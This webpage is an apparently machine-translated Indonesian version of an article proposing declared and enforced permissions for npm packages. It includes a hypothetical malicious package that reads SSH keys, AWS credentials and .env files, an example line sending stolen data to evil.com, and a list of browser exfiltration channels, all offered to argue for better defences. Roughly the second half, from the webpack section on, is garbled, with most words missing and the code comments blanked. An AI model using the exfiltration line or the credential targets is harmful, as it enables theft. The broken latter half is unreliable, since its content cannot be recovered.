<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🧜🏽 💅🏾 👩🏾‍🔧 Punya ide: sistem izin untuk paket npm 📟 ❇️ ✒️</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Beberapa hari yang lalu, saya pertama kali meluncurkan kalkulator pada telepon baru dan melihat pesan ini: "Kalkulator ingin mengakses kontak Anda." 
...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Punya ide: sistem izin untuk paket npm</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/ruvds/blog/433010/">  Beberapa hari yang lalu, saya pertama kali meluncurkan kalkulator pada telepon baru dan melihat pesan ini: "Kalkulator ingin mengakses kontak Anda." <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/bc6/ab2/2fb/bc6ab22fbd46e2703b3d248480a389cf.png"></div><br>  Pada awalnya, pesan ini tampak sedikit menyedihkan bagi saya (sepertinya kalkulator itu kesepian), tetapi kasus ini membuat saya berpikir ... <br><a name="habracut"></a><br>  Bagaimana jika, seperti aplikasi telepon, paket npm perlu mendeklarasikan izin yang diperlukan untuk pekerjaan mereka?  Dengan pendekatan ini, file paket <code>package.json</code> mungkin terlihat seperti ini: <br><br><pre> <code class="json hljs">{ <span class="hljs-attr"><span class="hljs-attr">"name"</span></span>: <span class="hljs-string"><span class="hljs-string">"fancy-logger"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"version"</span></span>: <span class="hljs-string"><span class="hljs-string">"0.1.0"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"permissions"</span></span>: {   <span class="hljs-attr"><span class="hljs-attr">"browser"</span></span>: [<span class="hljs-string"><span class="hljs-string">"network"</span></span>],   <span class="hljs-attr"><span class="hljs-attr">"node"</span></span>: [<span class="hljs-string"><span class="hljs-string">"http"</span></span>, <span class="hljs-string"><span class="hljs-string">"fs"</span></span>] }, <span class="hljs-attr"><span class="hljs-attr">"etcetera"</span></span>: <span class="hljs-string"><span class="hljs-string">"etcetera"</span></span> }</code> </pre> <br>  Pada <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">npmjs.com,</a> bagian dari halaman paket dengan informasi tentang izin yang diperlukan mungkin terlihat seperti ini. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/9ab/9e6/76d/9ab9e676da3e313c47d59e564afd21bc.png"></div><br>  <i>Bagian izin semacam itu mungkin tersedia untuk paket-paket di situs pendaftaran npm.</i> <br>  Daftar izin semacam itu untuk suatu paket mungkin merupakan kombinasi dari izin semua ketergantungannya dengan izinnya sendiri. <br><br>  Sekali melihat isi bagian <code>permissions</code> paket <code>fancy-logger</code> mungkin membuat pengembang berpikir mengapa paket yang menulis sesuatu ke konsol memerlukan akses ke modul <code>http</code> dan ini terlihat agak mencurigakan. <br><br>  Apa yang akan menjadi dunia di mana sistem izin serupa untuk paket npm akan digunakan?  Mungkin seseorang tidak akan mengerti maksudnya, karena ia merasa benar-benar aman, misalnya, hanya menggunakan paket yang dapat diandalkan dari penerbit yang sudah teruji.  Agar setiap orang yang membaca ini merasa rentan, berikut ini adalah cerita pendek. <br><br><h2>  <font color="#3AC1EF">Kisah bagaimana saya mencuri variabel lingkungan Anda</font> </h2><br>  Saya ingin membuat paket npm yang disebut <code>space-invaders</code> .  Sangat menarik untuk mempelajari cara membuat game dengan menulis game yang berfungsi di konsol, dan pada saat yang sama memperkuat pandangan saya tentang kerentanan terkait paket npm. <br><br>  Anda bisa menjalankan game ini dengan perintah ini: <code>npx space-invaders</code> .  Setelah diluncurkan, seseorang dapat segera mulai menembak alien dan menghabiskan waktu. <br><br>  Anda akan menyukai game ini, Anda akan membagikannya dengan teman-teman, mereka juga akan menyukainya. <br><br>  Semua ini terlihat sangat positif, tetapi, menghibur Anda, <code>space-invaders</code> permainan akan melakukan <code>space-invaders</code> sendiri, yaitu pengumpulan beberapa data.  Ini akan mengumpulkan informasi dari <code>~/.ssh/</code> , <code>~/.aws/credentials</code> , dari <code>~/.bash_profile</code> dan tempat-tempat serupa lainnya, membaca isi semua file <code>.env</code> yang dapat dijangkau, termasuk <code>process.env</code> , lihat ke konfigurasi git (untuk mengetahui informasi siapa yang dikumpulkannya), dan kemudian dia mengirim semuanya ke server saya. <br><br>  Saya belum menulis permainan seperti itu, tetapi selama beberapa waktu saya merasa tidak nyaman, dan ketika saya menjalankan perintah <code>npm install</code> , saya berpikir tentang betapa rentannya sistem saya.  Sekarang, melihat indikator kemajuan instalasi, saya berpikir tentang berapa banyak folder dan file standar pada laptop saya yang isinya tidak boleh jatuh ke tangan yang salah. <br><br>  Dan ini bukan hanya tentang ruang kerja saya.  Misalnya, saya bahkan tidak tahu apakah ada data dalam beberapa variabel lingkungan dari sistem perakitan situs saya untuk terhubung ke database server produksi.  Jika di suatu tempat ada data seperti itu, maka Anda dapat membayangkan situasi di mana paket npm berbahaya menginstal skrip dalam sistem yang dirancang untuk terhubung ke database kerja saya.  Kemudian skrip ini mengeksekusi <code>SELECT * from users</code> perintah <code>SELECT * from users</code> , lalu <code>http.get('http://evil.com/that-data')</code> .  Mungkin justru karena kemungkinan serangan seperti itu saya menemukan saran bahwa kata sandi tidak boleh disimpan dalam database dalam teks biasa? <br><br>  Semua ini terlihat sangat menakutkan, dan kemungkinan besar sudah terjadi (walaupun tidak mungkin untuk mengatakan dengan tepat apakah ini terjadi atau tidak). <br><br>  Dengan ini, mungkin, kita akan berhenti berbicara tentang konsekuensi dari pencurian data penting.  Mari kita kembali ke topik izin untuk paket npm. <br><br><h2>  <font color="#3AC1EF">Kunci Perubahan Izin</font> </h2><br>  Saya kira itu akan bagus untuk dapat melihat izin yang diperlukan oleh paket saat melihat situs npm.  Tetapi harus dicatat bahwa kemampuan untuk melihat izin hanya baik ketika diterapkan pada titik waktu tertentu, pada kenyataannya, ini tidak menyelesaikan masalah sebenarnya. <br><br>  Dalam kejadian baru-baru ini di npm, seseorang pertama kali menerbitkan versi tambalan paket dengan kode berbahaya, dan kemudian menerbitkan versi kecil dari mana kode jahat telah dihapus.  Waktu antara dua peristiwa ini cukup untuk membahayakan banyak pengguna paket berbahaya. <br><br>  Ini masalahnya.  Bukan paket yang dibuat oleh malware dan tetap demikian sepanjang waktu.  Masalahnya adalah bahwa dalam paket yang tampaknya dapat diandalkan, Anda dapat dengan diam-diam menambahkan sesuatu yang buruk dan setelah beberapa saat menghapusnya. <br><br>  Sebagai hasilnya, kita dapat mengatakan bahwa kita memerlukan mekanisme untuk memblokir set izin yang diterima oleh paket. <br><br>  Mungkin itu akan menjadi sesuatu seperti file <code>package-permissions.json</code> yang menetapkan izin untuk Node.js dan untuk browser dan berisi daftar paket yang memerlukan izin ini.  Dengan pendekatan ini, akan perlu untuk membuat daftar semua paket dalam file seperti itu, dan bukan hanya mereka yang ada di bagian <code>dependencies</code> dari file <code>package.json</code> proyek. <br><br>  Di sini terlihat seperti apa file <code>package-permissions.json</code> . <br><br><pre> <code class="json hljs">{ <span class="hljs-attr"><span class="hljs-attr">"node"</span></span>: {   <span class="hljs-attr"><span class="hljs-attr">"http"</span></span>: [     <span class="hljs-string"><span class="hljs-string">"express"</span></span>,     <span class="hljs-string"><span class="hljs-string">"stream-http"</span></span>   ],   <span class="hljs-attr"><span class="hljs-attr">"fs"</span></span>: [     <span class="hljs-string"><span class="hljs-string">"fs-extra"</span></span>,     <span class="hljs-string"><span class="hljs-string">"webpack"</span></span>,     <span class="hljs-string"><span class="hljs-string">"node-sass"</span></span>   ] }, <span class="hljs-attr"><span class="hljs-attr">"browser"</span></span>: {   <span class="hljs-attr"><span class="hljs-attr">"network"</span></span>: [     <span class="hljs-string"><span class="hljs-string">"whatwg-fetch"</span></span>,     <span class="hljs-string"><span class="hljs-string">"new-relic"</span></span>   ] } }</code> </pre> <br>  Versi nyata dari file semacam itu bisa berisi lebih banyak entri paket. <br><br>  Sekarang bayangkan bahwa suatu hari Anda memperbarui paket dengan dua ratus dependensi yang juga akan diperbarui.  Versi tambalan telah diterbitkan untuk salah satu dari dependensi ini, yang tiba-tiba membutuhkan akses ke <code>http</code> Node.js. <br><br>  Jika ini terjadi, perintah <code>npm install</code> akan gagal dengan pesan yang mirip dengan berikut ini: “Paket <code>add-two-number</code> yang dibutuhkan oleh paket <code>fancy-logger</code> meminta akses ke <code>http</code> Node.js.  Jalankan <code>npm update-permissions add-two-numbers</code> untuk menyelesaikan ini, kemudian jalankan perintah <code>npm install</code> lagi. " <br><br>  Di sini, <code>fancy-logger</code> adalah paket yang ada di file <code>package.json</code> Anda (dengan asumsi Anda sudah terbiasa dengan paket ini), dan paket <code>add-two-numbers</code> adalah dependensi <code>fancy-logger</code> yang belum pernah Anda dengar. <br><br>  Tentu saja, bahkan jika ada file dalam sistem untuk "memblokir" dependensi, beberapa pengembang akan mengkonfirmasi izin baru tanpa memikirkan apa pun.  Tapi, minimal, perubahan dalam <code>package-permissions.json</code> akan terlihat dalam permintaan tarik, yaitu, akan ada kemungkinan bahwa pengembang lain yang lebih bertanggung jawab akan memperhatikan hal ini. <br><br>  Lebih lanjut, perubahan pada izin yang diminta akan membutuhkan registri npm itu sendiri untuk memberi tahu penulis paket ketika situasi berubah di suatu tempat di pohon dependensi paket mereka.  Mungkin - ini akan dilakukan melalui email dengan konten berikut: <br><br>  "Halo, penulis <code>fancy-logger</code> .  Kami memberi tahu Anda bahwa <code>add-two-number</code> , paket yang kemampuannya Anda gunakan, meminta izin untuk bekerja dengan modul <code>http</code> .  Izin paket Anda, seperti yang ditunjukkan pada <code>npmjs.com/package/fancy-logger</code> , telah diperbarui. " <br><br>  Ini, tentu saja, akan menambah pekerjaan kedua penulis paket dan npm sendiri, tetapi hal-hal ini akan layak menghabiskan sedikit waktu pada paket-paket itu.  Dalam hal ini, penulis <code>add-two-numbers</code> dapat benar-benar yakin bahwa jika ia meminta izin untuk bekerja dengan modul <code>http</code> , ini akan memicu banyak "alarm" di seluruh dunia. <br><br>  Itu yang kita butuhkan.  Hah?  Saya ingin berharap bahwa, seperti dalam hal aplikasi telepon, dan bahkan dalam kasus ekstensi untuk Chrome, paket yang membutuhkan lebih sedikit izin akan lebih populer di kalangan pengguna daripada mereka yang membutuhkan tingkat akses yang tinggi ke sistem yang tidak dapat dijelaskan.  Ini, pada gilirannya, akan membuat penulis paket berpikir dengan baik ketika memilih izin yang diperlukan untuk pengembangan mereka. <br><br>  Misalkan npm memutuskan untuk memperkenalkan sistem izin.  Pada hari pertama peluncuran sistem seperti itu, semua paket akan dianggap membutuhkan izin penuh (keputusan seperti itu akan dibuat kemudian - dalam kasus di mana bagian <code>permissions</code> tidak ada dalam <code>package.json</code> ). <br><br>  Penulis paket, yang ingin mengklaim bahwa paketnya tidak memerlukan izin khusus, akan tertarik untuk menambahkan bagian <code>permissions</code> di <code>package.json</code> sebagai objek kosong.  Dan, jika pembuat paket cukup tertarik sehingga izin dependensi tidak "membebani" paket mereka, mereka akan mencoba memastikan bahwa paket dependensi ini juga tidak memerlukan izin khusus, misalnya, dengan membuat permintaan tarikan yang sesuai dalam repositori dependensi. <br><br>  Selain itu, setiap penulis paket akan berusaha untuk mengurangi risiko kerentanan paketnya ketika melanggar salah satu dependensinya.  Oleh karena itu, jika pembuat paket menggunakan dependensi yang memerlukan izin, yang, tampaknya, tidak diperlukan, mereka akan memiliki insentif untuk beralih menggunakan paket lain. <br><br>  Dan dalam kasus pengembang yang menggunakan paket-paket npm ketika membuat aplikasi, ini akan memaksa mereka untuk memberikan perhatian khusus pada paket-paket yang digunakan dalam proyek-proyek mereka, terutama memilih mereka yang tidak memerlukan izin khusus.  Pada saat yang sama, tentu saja, beberapa paket, karena alasan obyektif, akan memerlukan izin yang dapat menyebabkan masalah, tetapi paket tersebut cenderung berada di bawah kendali khusus pengembang. <br><br>  Mungkin sesuatu seperti <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Greenkeeper</a> dapat membantu dalam beberapa cara untuk menyelesaikan semua masalah ini. <br><br>  Akhirnya, file <code>package-permissions.json</code> akan memberikan ringkasan yang mudah dipahami untuk seorang profesional keamanan yang mengevaluasi "lubang" potensial dalam aplikasi dan memungkinkan Anda untuk mengajukan pertanyaan spesifik tentang paket kontroversial dan izinnya. <br><br>  Sebagai hasilnya, saya berharap properti <code>permissions</code> sederhana ini dapat menyebar cukup luas di antara sekitar 800.000 paket npm dan menjadikan npm lebih aman. <br><br>  Tentu saja, ini tidak akan mencegah kemungkinan serangan.  Seperti halnya izin yang diminta oleh aplikasi seluler tidak membuat mustahil untuk membuat aplikasi seluler berbahaya yang didistribusikan melalui situs resmi.  Tetapi ini akan mempersempit "permukaan serangan" ke paket yang secara eksplisit meminta izin untuk melakukan tindakan tertentu yang dapat menimbulkan ancaman bagi sistem komputer.  Selain itu, akan menarik untuk mengetahui tentang persentase paket yang tidak memerlukan izin khusus sama sekali. <br><br>  Ini adalah mekanisme untuk bekerja dengan izin untuk paket npm yang saya pikirkan.  Jika ide ini menjadi kenyataan, kita bisa mengandalkan fakta bahwa penyerang akan dengan jujur ​​menggambarkan paket mereka dengan mendeklarasikan izin, atau menggabungkan sistem menyatakan izin dengan mekanisme pembatasan paksa kemampuan paket sesuai dengan izin yang diminta oleh mereka.  Ini pertanyaan yang menarik.  Mari kita melihatnya seperti yang diterapkan pada Node.js dan browser. <br><br><h2>  <font color="#3AC1EF">Memaksa pembatasan paket sesuai dengan izin yang diminta oleh mereka di Node.js</font> </h2><br>  Di sini saya melihat dua opsi yang memungkinkan untuk menerapkan pembatasan tersebut. <br><br><h3>  <font color="#3AC1EF">▍ Opsi 1: paket npm khusus yang memaksa tindakan keamanan</font> </h3><br>  Bayangkan sebuah paket yang dibuat dan dikelola oleh npm (atau organisasi lain yang sama-sama berwibawa dan visioner).  Biarkan paket ini disebut <code>@npm/permissions</code> . <br><br>  Paket seperti itu akan dimasukkan dalam kode aplikasi dengan perintah impor pertama, atau aplikasi akan diluncurkan dengan perintah dari bentuk <code>node -r @npm/permissions index.js</code> . <br><br>  Paket akan menimpa perintah impor lainnya sehingga mereka tidak akan melanggar izin yang dinyatakan di bagian <code>permissions</code> <code>package.json</code> file dari paket lain.  Jika pembuat paket tertentu yang tidak mencatat kebutuhan untuk paket ini dalam modul <code>http</code> Node.js, ini berarti bahwa paket seperti itu tidak dapat diakses oleh modul ini. <br><br>  Sebenarnya, memblokir seluruh modul Node.js dengan cara ini tidak ideal.  Sebagai contoh, paket <code>methods</code> npm memuat modul <code>http</code> Node.js, tetapi tidak mengirim data apa pun yang menggunakannya.  Hanya mengambil objek <code>http.METHODS</code> , mengubah namanya menjadi <code>http.METHODS</code> , dan mengekspornya sebagai paket npm klasik.  Sekarang paket seperti itu terlihat seperti target yang bagus untuk penyerang - ia memiliki 6 juta unduhan per minggu, sementara ia tidak berubah selama 3 tahun.  Saya bisa menulis kepada penulis paket ini dan mengundang mereka untuk memberi saya repositori. <br><br>  Mempertimbangkan paket <code>methods</code> , akan lebih baik untuk mempertimbangkan bahwa itu tidak memerlukan izin <code>network</code> , dan bukan izin yang memberikan akses ke modul <code>http</code> .  Kemudian pembatasan ini dapat diperbaiki dengan menggunakan mekanisme eksternal dan menetralisir segala upaya paket ini untuk mengirim data tertentu dari sistem di mana ia bekerja. <br><br>  Paket imajiner <code>@npm/permissions</code> juga dapat membatasi akses dari satu paket ke paket lain yang tidak terdaftar sebagai dependensinya.  Ini akan mencegah paket, misalnya, mengimpor sesuatu seperti <code>fs-extra</code> dan <code>request</code> , dan menggunakan kemampuan paket-paket ini untuk membaca data dari sistem file dan mengirim data baca ke penyerang. <br><br>  Demikian pula, mungkin berguna untuk membedakan antara akses disk "internal" dan "eksternal".  Saya cukup senang bahwa paket <code>node-sass</code> membutuhkan akses ke bahan-bahan yang terletak di dalam direktori proyek saya, tetapi saya tidak melihat alasan mengapa paket ini membutuhkan akses ke apa pun di luar direktori ini. <br><br>  Mungkin, pada awal pengenalan sistem izin, paket <code>@npm/permissions</code> perlu ditambahkan ke proyek secara manual.  Mungkin, selama masa transisi, selama penghapusan kerusakan yang tak terhindarkan, ini adalah satu-satunya pendekatan yang masuk akal untuk menggunakan mekanisme semacam itu.  Tetapi untuk memastikan keamanan yang nyata, paket ini perlu diintegrasikan secara ketat ke dalam sistem, karena akan diperlukan untuk mempertimbangkan izin akun ketika menjalankan skrip instalasi paket. <br><br>  Kemudian, kemungkinan besar, ternyata perintah sederhana dari bentuk <code>"enforcePermissions": true</code> dalam file <code>package.json</code> proyek akan memberitahu npm untuk menjalankan skrip apa pun dengan penggunaan paksa dari izin yang dinyatakan oleh mereka. <br><br><h3>  <font color="#3AC1EF">▍ Opsi 2: Safe Mode Node.js</font> </h3><br>  Mode operasi khusus Node.js, yang difokuskan pada peningkatan tingkat keamanan, jelas, akan membutuhkan perubahan yang lebih serius.  Tapi mungkin dalam jangka panjang, platform Node.js sendiri akan dapat memberlakukan pembatasan yang ditetapkan oleh izin yang dinyatakan oleh setiap paket. <br><br>  Di satu sisi, saya tahu bahwa mereka yang mengembangkan platform Node.js berusaha untuk menyelesaikan masalah platform ini, dan ide-ide saya tentang keamanan paket npm melampaui lingkup kepentingan mereka.  Bagaimanapun, pada akhirnya, npm hanyalah teknologi yang menyertai Node.js.  Di sisi lain, pengembang Node.js tertarik untuk membuat pengguna korporat merasa percaya diri bekerja dengan platform ini, dan keamanan, mungkin, adalah salah satu aspek Node.js yang tidak boleh diserahkan kepada "komunitas". <br><br>  Jadi, untuk saat ini, semua yang kita bicarakan terlihat sangat sederhana dan direbus untuk memastikan bahwa sistem dengan satu atau lain cara akan memantau kemampuan yang digunakan oleh modul selama operasi Node.js. <br><br>  Sekarang mari kita bicara tentang browser.  Semuanya di sini tidak terlihat begitu jelas dan dapat dimengerti sama sekali. <br><br><h2>  <font color="#3AC1EF">Pembatasan paksa dari kemampuan paket sesuai dengan izin yang diminta di browser</font> </h2><br>  Sekilas, pembatasan paksa kemampuan paket di browser terlihat lebih sederhana, karena kode yang berjalan di browser tidak dapat berbuat banyak terutama sehubungan dengan sistem operasi tempat browser berjalan.  Bahkan, dalam hal browser, Anda hanya perlu khawatir tentang kemampuan paket untuk mentransfer data ke alamat yang tidak biasa. <br><br>  Masalahnya di sini adalah bahwa ada banyak cara untuk mengirim data dari browser pengguna ke server penyerang. <br><br>  Ini disebut exfiltration atau kebocoran data, dan jika Anda bertanya kepada seorang profesional keamanan tentang cara menghindari ini, dia, dengan penampilan orang yang menemukan bubuk mesiu, akan memberitahu Anda untuk berhenti menggunakan npm. <br><br>  Saya percaya bahwa untuk paket yang berjalan di browser, Anda hanya perlu memperhatikan satu resolusi - resolusi yang bertanggung jawab atas kemampuan untuk bekerja dengan jaringan.  Sebut saja <code>network</code> .  Mungkin ada izin lain di lingkungan ini (seperti yang mengatur akses ke DOM atau penyimpanan lokal), tetapi di sini saya melanjutkan dari asumsi bahwa kekhawatiran utama kami adalah kemungkinan kebocoran data. <br><br>  Data dari browser dapat "dihapus" dengan berbagai cara.  Inilah yang dapat saya ingat dalam 60 detik: <br><br><ul><li>  <code>fetch</code> API. </li><li>  Soket Web </li><li>  Teknologi WebRTC. </li><li>  Pembuat <code>EventSource</code> . </li><li>  API <code>XMLHttpRequest</code> </li><li>  Mengatur properti <code>innerHTML</code> dari berbagai elemen (Anda dapat membuat elemen baru). </li><li>  Membuat objek gambar dengan perintah <code>new Image()</code> (properti <code>src</code> dari suatu gambar dapat berfungsi sebagai sarana exfiltrating data). </li><li>  Pengaturan <code>document.location</code> , <code>window.location</code> , dan sebagainya. </li><li>  Mengubah properti <code>src</code> dari gambar yang ada, <code>iframe</code> atau sesuatu seperti itu. </li><li>  Perubahan pada properti <code>target</code> dari elemen <code>&lt;form&gt;</code> . </li><li>  Menggunakan string yang dirancang dengan cerdik untuk mengakses mekanisme mana pun di atas atau untuk mengakses sesuatu di <code>top</code> atau <code>self</code> alih-alih <code>windows</code> . </li></ul><br>  Perlu dicatat bahwa Kebijakan Keamanan Konten (CSP) yang baik mampu menetralkan beberapa ancaman ini, tetapi ini tidak berlaku untuk semuanya.  Jika seseorang dapat memperbaiki saya, saya akan senang, tetapi saya yakin Anda tidak akan pernah bisa mengandalkan fakta bahwa CSP akan sepenuhnya melindungi Anda dari kebocoran data.  Satu orang pernah mengatakan kepada saya bahwa CSP menyediakan perlindungan yang hampir lengkap terhadap sejumlah besar ancaman.  Terhadap ini saya menjawab bahwa Anda tidak bisa hamil sedikit, dan sejak itu kami belum berkomunikasi dengan orang ini. <br><br>  Jika Anda dengan bijak mendekati pencarian cara untuk mencuri data dari browser, saya yakin itu cukup realistis untuk membuat daftar metode ini yang cukup lengkap. <br><br>  Sekarang kita perlu menemukan mekanisme untuk melarang akses ke penggunaan peluang dari daftar semacam itu. <br><br>        Webpack (,    <code>@npm/permissions-webpack-plugin</code> ),     : <br><br><ul><li>         <code>browser</code>  <code>package-permissions.json</code>   ,  npm-      (  -  ,  ). </li><li>  ,   ,     ,        API,        . </li></ul><br> (,       Parcel, Rollup, Browserify     ). <br><br> , ,     -.    ,          ,        , , ,        . <br><br>   ,        ( Lodash, Moment,   ),       .        . <br><br>            . <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">//   (),   ,    function bigFrameworkWrapper(newWindow) { /*  --     -- */ const window = newWindow; const document = window.document; //      /*  --    -- */ const module = {   doSomething() {     const newDiv = document.createElement('div'); //      const newScript = document.createElement('script'); //      const firstDiv = document.querySelector('div'); //    }, }; return module; } //   ( ),   ,    function smallUtilWrapper(newWindow) { /*  --     -- */ const window = newWindow; const document = window.document; //      /*  --    -- */ const module = {   doSomething() {     const newDiv = document.createElement('div'); //      const newScript = document.createElement('script'); //  !     const firstDiv = document.querySelector('div'); //    }, }; return module; } const restrictedWindow = new Proxy(window, { get(target, prop, receiver) {   if (prop === 'document') {     return new Proxy(target.document, {       get(target, prop, receiver) {         if (prop === 'createElement') {           return new Proxy(window.document.createElement, {             apply(target, thisArg, argumentsList) {               if (['script', 'img', 'audio', 'and-so-on'].includes(argumentsList[0])) {                 console.error('A module without permissions attempted to create a naughty element');                 return false;               }               return target.apply(window.document, argumentsList);             },           });         }         const result = Reflect.get(target, prop, receiver);         if (typeof result === 'function') return result.bind(target);         return result;       },     });   }   return Reflect.get(target, prop, receiver); }, }); const bigFramework = bigFrameworkWrapper(window); bigFramework.doSomething(); //   const smallUtil = smallUtilWrapper(restrictedWindow); smallUtil.doSomething(); // ! "A module without permissions attempted to create a naughty element"</span></span></code> </pre> <br>  <code>function bigFrameworkWrapper(newWindow) {</code>  <code>function smallUtilWrapper(newWindow) {</code> —  ,    .  «»      . <br><br>   <code>const newScript = document.createElement('script'); //  !</code>  ,         —    <code>script</code> . <br><br>   <code>const bigFramework = bigFrameworkWrapper(window);</code>  <code>const smallUtil = smallUtilWrapper(restrictedWindow);</code>  «»     . ,      ,    . <br><br>   <code>const restrictedWindow = new Proxy(window, {</code>    <code>window</code> ,    ,     <code>window</code> ,   ,           <code>window.document.createElement</code>    DOM  . <br><br>     <code>Proxy</code> . <br><br>       .         ,           . <br><br> ,   ,       API,      .   ,     ,   ,  ,  ,     ,        ,    ,   ,     ,  «»   . <br><br>      ,   ,     ,   -     . <br><br> , ,  ,        ,       <code>Proxy</code> . ,      90% ,   .        ,         ,   . ,    -   ,             ,   ,  . <br><br>  ,   , ,       ,     ,              Node.js       . <br><br><h2> <font color="#3AC1EF"> </font> </h2><br>  ,   ,    HTTP   ,  , ,          -.  Ini bisa dimengerti. <br><br>     -,   ,  ,              .    <code>iframe</code> ,    .     <code>sandbox</code> ,    ,     .  ,    ,   ,     -. <br><br> ,   ,     <code>sandbox</code>  <code>&lt;script&gt;</code> .     : <code>&lt;script src="/some-package.js" sandbox="allow-exfiltration allow-whatevs"&gt;&lt;script&gt;</code> .      ,       ,      ,      - <code>create-react-app</code> ,   1.4   ,          . <br><br>     ,            npm  ,      . <br><br>  ,      -  . <br><br> ,  ,    -    « ...»,     ,   ,       ? <br><br><h2>  <font color="#3AC1EF">Ringkasan</font> </h2><br>  ,   ,     , ,              .      ,  90% ,   ,    ,    10% — ,    . <br><br> ,          ,           -  . <br><br>  <b>Pembaca yang budiman!</b>   ,  ,       npm,   -? <br><br> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><img src="https://habrastorage.org/files/1ba/550/d25/1ba550d25e8846ce8805de564da6aa63.png"></a> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id433010/">https://habr.com/ru/post/id433010/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id432998/index.html">Cerita natal</a></li>
<li><a href="../id433000/index.html">Kompilasi Kotlin: JetBrains VS ANTLR VS JavaCC</a></li>
<li><a href="../id433002/index.html">Ayo dirimu sendiri ... atau aturan komunikasi dalam tim</a></li>
<li><a href="../id433004/index.html">Strategi migrasi awan yang kuat untuk tips 2019: 7</a></li>
<li><a href="../id433008/index.html">Perangkat USB adalah ancaman "mendadak"</a></li>
<li><a href="../id433012/index.html">Mungkin saya hanya hidup karena dia: mengapa pasien dengan apnea bergantung pada program yang ditulis oleh seorang hacker</a></li>
<li><a href="../id433014/index.html">Lelucon tentang pelepasan astronot baru-baru ini ke luar angkasa</a></li>
<li><a href="../id433016/index.html">Perubahan antarmuka, animasi berlapis, dan kekacauan visual terstruktur: tinjauan tren web untuk 2019</a></li>
<li><a href="../id433018/index.html">UDB. Apa ini Bagian 2. Datapath</a></li>
<li><a href="../id433030/index.html">Live: kinerja front-end</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>